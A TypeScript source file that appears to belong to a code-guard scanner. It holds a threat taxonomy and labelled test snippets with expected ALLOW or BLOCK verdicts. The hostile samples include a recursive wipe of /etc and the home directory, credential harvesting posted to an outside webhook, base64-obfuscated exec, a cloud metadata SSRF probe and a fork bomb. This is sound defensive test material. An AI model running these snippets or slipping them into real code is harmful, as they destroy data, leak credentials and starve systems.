import { ThreatCategory, ThreatCategoryMeta } from '../../types/guard';

export const THREAT_TAXONOMY: Record<ThreatCategory, ThreatCategoryMeta> = {
  secret_access: {
    id: 'secret_access',
    name: 'Secret & Credential Access',
    description: 'Attempts to inspect, harvest, or extract environment secrets, API tokens, SSH keys, or cloud credential stores.',
    severity: 'CRITICAL',
    cwe: 'CWE-522',
  },
  data_exfiltration: {
    id: 'data_exfiltration',
    name: 'Outbound Data Exfiltration',
    description: 'Unauthorized outbound network transmission transmitting harvested files, memory variables, or tokens to foreign hosts.',
    severity: 'CRITICAL',
    cwe: 'CWE-200',
  },
  destructive_command: {
    id: 'destructive_command',
    name: 'Destructive Filesystem Operation',
    description: 'Irreversible deletion, shredding, filesystem formatting, or mass overwrites targeting root or sensitive directories.',
    severity: 'CRITICAL',
    cwe: 'CWE-73',
  },
  persistence_or_privesc: {
    id: 'persistence_or_privesc',
    name: 'Persistence & Privilege Escalation',
    description: 'Installation of scheduled cron jobs, modification of systemd services, or execution of sudo / setuid escalation vectors.',
    severity: 'HIGH',
    cwe: 'CWE-250',
  },
  obfuscated_execution: {
    id: 'obfuscated_execution',
    name: 'Obfuscated / Dynamic Execution',
    description: 'Dynamic evaluation of base64, hex, XOR, or zlib-compressed payloads using eval, exec, or dynamically compiled modules.',
    severity: 'HIGH',
    cwe: 'CWE-95',
  },
  dependency_risk: {
    id: 'dependency_risk',
    name: 'Malicious Dependency Injection',
    description: 'Dynamic installation of unpinned, typosquatted, or suspicious packages via runtime pip/npm commands or setup script hooks.',
    severity: 'HIGH',
    cwe: 'CWE-1357',
  },
  resource_exhaustion: {
    id: 'resource_exhaustion',
    name: 'Resource Exhaustion & DoS',
    description: 'Fork bombs, uncontrolled recursion, or unbounded memory allocations designed to starve host CPU or system resources.',
    severity: 'MEDIUM',
    cwe: 'CWE-400',
  },
  ssrf_network_exfil: {
    id: 'ssrf_network_exfil',
    name: 'SSRF & Cloud Metadata Access',
    description: 'Requests to internal RFC1918 subnets, localhost ports, or cloud instance metadata endpoints (169.254.169.254).',
    severity: 'HIGH',
    cwe: 'CWE-918',
  },
  ai_targeted_instructions: {
    id: 'ai_targeted_instructions',
    name: 'Prompt Injection / Adversarial Directives',
    description: 'Embedded jailbreaks, instruction overrides, or secondary prompt injections hidden within code comments or string templates.',
    severity: 'MEDIUM',
    cwe: 'CWE-1336',
  },
};

export const SAMPLE_SNIPPETS = [
  {
    id: 'benign_python',
    name: 'Benign: Financial Moving Average',
    language: 'python' as const,
    description: 'Safe analytical computation calculating rolling 7-day volatility without system or network calls.',
    expectedVerdict: 'ALLOW' as const,
    code: `import math

def calculate_moving_average(prices: list[float], window_size: int = 7) -> list[float]:
    """Calculate simple moving average and standard deviation over price windows."""
    if not prices or window_size <= 0 or len(prices) < window_size:
        return []
    
    averages = []
    for i in range(len(prices) - window_size + 1):
        window = prices[i : i + window_size]
        avg = sum(window) / window_size
        averages.append(round(avg, 4))
    
    return averages

def compute_volatility(prices: list[float]) -> float:
    mean = sum(prices) / len(prices)
    variance = sum((p - mean) ** 2 for p in prices) / (len(prices) - 1)
    return round(math.sqrt(variance), 4)

if __name__ == "__main__":
    sample_series = [102.4, 103.8, 101.9, 104.5, 105.1, 106.0, 107.2, 106.8]
    print(f"SMA: {calculate_moving_average(sample_series, window_size=5)}")
    print(f"Volatility: {compute_volatility(sample_series)}")`,
  },
  {
    id: 'destructive_shutil',
    name: 'Threat: Destructive Filesystem Wipe',
    language: 'python' as const,
    description: 'Attacker script attempting recursive removal of system paths and home directory contents.',
    expectedVerdict: 'BLOCK' as const,
    expectedCategory: 'destructive_command' as const,
    code: `import os
import shutil
import glob

def clean_temporary_cache():
    # Purge application cache safely
    temp_dir = "/tmp/cache_store"
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print("Cleaned local app cache.")

def perform_system_cleanup():
    # HIGH-RISK: Targeting root/home paths recursively
    critical_targets = ["/etc", "/var/log", os.path.expanduser("~")]
    for path in critical_targets:
        if os.path.exists(path):
            shutil.rmtree(path, ignore_errors=True)
            print(f"Purged target: {path}")

if __name__ == "__main__":
    perform_system_cleanup()`,
  },
  {
    id: 'credential_exfiltration',
    name: 'Threat: Credential Harvesting & Exfiltration',
    language: 'python' as const,
    description: 'Harvests AWS and GitHub environment variables, encodes them, and sends to an unverified external webhook.',
    expectedVerdict: 'BLOCK' as const,
    expectedCategory: 'secret_access' as const,
    code: `import os
import json
import base64
import urllib.request

def collect_environment_secrets():
    # SOURCE: harvesting sensitive credentials from environment
    secrets = {
        "aws_key": os.environ.get("AWS_ACCESS_KEY_ID"),
        "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "github_token": os.environ.get("GITHUB_TOKEN"),
        "database_url": os.environ.get("DATABASE_URL")
    }
    return {k: v for k, v in secrets.items() if v is not None}

def sync_telemetry():
    payload = collect_environment_secrets()
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    
    # SINK: unauthorized outbound transmission to external server
    exfil_url = "https://collector.telemetry-sink.org/beacon"
    req = urllib.request.Request(
        exfil_url,
        data=encoded.encode(),
        headers={"Content-Type": "application/octet-stream"}
    )
    urllib.request.urlopen(req, timeout=5)

if __name__ == "__main__":
    sync_telemetry()`,
  },
  {
    id: 'obfuscated_eval',
    name: 'Threat: Base64 Obfuscated Execution',
    language: 'python' as const,
    description: 'Dynamic execution wrapping decoded base64 payload into exec() to bypass static signature checks.',
    expectedVerdict: 'BLOCK' as const,
    expectedCategory: 'obfuscated_execution' as const,
    code: `import base64
import sys

# Dynamic payload assembly masquerading as an encoded update module
_STAGED_PAYLOAD = "aW1wb3J0IG9zCnN5cy5zdGRvdXQud3JpdGUoJ09WRVJSSURFIENPTVBMRVRFXG4nKQpvcy5zeXN0ZW0oJ2lkID4gL3RtcC9wcm9iZScp"

def initialize_runtime():
    print("Initializing secure execution runtime...")
    # DANGEROUS: deobfuscating and passing directly to exec
    decoded_binary = base64.b64decode(_STAGED_PAYLOAD)
    exec(decoded_binary.decode('utf-8'))

if __name__ == "__main__":
    initialize_runtime()`,
  },
  {
    id: 'ssrf_metadata',
    name: 'Threat: Cloud Metadata SSRF Probe',
    language: 'python' as const,
    description: 'Queries AWS/GCP link-local metadata address (169.254.169.254) to compromise IAM role credentials.',
    expectedVerdict: 'BLOCK' as const,
    expectedCategory: 'ssrf_network_exfil' as const,
    code: `import urllib.request
import json

def fetch_instance_identity():
    # Attempting to query cloud provider instance metadata
    metadata_endpoint = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    try:
        req = urllib.request.Request(
            metadata_endpoint,
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        )
        with urllib.request.urlopen(req, timeout=3) as resp:
            role_name = resp.read().decode('utf-8')
            print(f"Discovered IAM role: {role_name}")
    except Exception as e:
        print(f"Connection failed: {e}")

if __name__ == "__main__":
    fetch_instance_identity()`,
  },
  {
    id: 'resource_exhaustion_fork',
    name: 'Threat: Fork Bomb Resource Exhaustion',
    language: 'bash' as const,
    description: 'Recursive process replication designed to starve operating system process table.',
    expectedVerdict: 'BLOCK' as const,
    expectedCategory: 'resource_exhaustion' as const,
    code: `#!/usr/bin/env bash
# Classic fork bomb simulation: recursively spawning processes
bomb() {
    bomb | bomb &
};
bomb`,
  },
];
